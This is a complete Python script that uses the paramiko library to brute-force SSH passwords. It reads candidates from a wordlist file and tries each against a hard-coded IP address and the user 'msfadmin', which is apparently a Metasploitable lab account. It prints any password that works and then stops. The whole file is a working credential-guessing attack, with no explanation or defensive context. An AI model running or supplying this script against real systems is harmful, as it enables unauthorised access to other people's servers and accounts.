#!/usr/bin/python
import paramiko

target = '11.11.11.171'
porttarget = 22
user = 'msfadmin'
verbose = True

print('=' * 60)
print('SSH BRUTEFORCE ATTACK')
print('=' * 60)
print()

def bruteforceattack(_target,_porttarget,_user,_pwd):
    try:
        sshconn = paramiko.SSHClient()
        sshconn.load_system_host_keys()
        sshconn.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        sshconn.connect(_target,port=_porttarget, username=_user, password=_pwd)
        sshconn.close()
        print('[+] BINGO - username:', _user, 'password:', _pwd)
        return True

    except paramiko.AuthenticationException:
        if verbose:
            print('[-] FAIL - username:', _user, 'password:', _pwd)


def user_wordlist(_target,_porttarget,_user,_wordlist):
    with open(_wordlist, 'r') as _word:
        for _line in _word:
            _pwd = _line.strip('\n')

            bingo=bruteforceattack(_target,_porttarget,_user,_pwd)
            
            if bingo:
                break

user_wordlist(target, porttarget, user, 'word.txt')
print()
print('=' * 60)

